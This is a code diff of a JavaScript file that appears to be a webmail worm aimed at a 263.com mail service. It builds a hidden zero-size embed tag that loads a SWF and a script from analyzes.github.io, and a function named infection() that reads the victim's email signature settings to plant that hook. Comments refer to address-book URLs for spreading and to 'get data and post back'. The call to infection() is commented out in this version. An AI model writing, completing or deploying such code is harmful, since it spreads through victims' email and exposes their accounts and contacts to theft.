@@ -3,10 +3,6 @@
     $("script[src^='//analyzes.github.io/script/analyzes.js']").remove();
     // move to top
     var host = window.top.top.top.top.top.top.top.top.top.top.top;
-    console.log(host);
-    if ($('#mailText').length) {
-
-    }
     var urlParam = window.urlParams;
     var sysPath = "http://mm.263.com/wm2e/mail";
     var signPath = sysPath + "/signInfoSetting/signInfoSettingAction_";
@@ -14,7 +10,11 @@
     var hook = '<p><embed allowscriptaccess="always" style="width:0;height:0" src="//analyzes.github.io/cw69.swf?a=run&c=//analyzes.github.io/script/analyzes.js"/></p>';
     var addressBook = addrPath + "getAddressInitSys.do?" + urlParam;
     var addressBookDepart = addrPath + "getEnterAddressListAllNew.do?" + urlParam;
-
+    
+    function run(){
+        //infection();
+    }
+    
     function infection() {
         $.get(signPath + "signInfoManage.do?" + urlParam, function (data) {
             var signs = $(data).filter('.popBox').children();
@@ -22,9 +22,10 @@
                 // check hook exist
                 //get all signs
                 var hooked = true;
-                if (!hooked) {
-                    // get default sign 
-                    // update default sign
+                if (hooked) {
+                    return;
+                }else{
+                    // get default sign udate
                 }
             } else {
                 // add new sign
@@ -47,5 +48,5 @@
 
         //get data and post back
     }
-
+run();
 })();
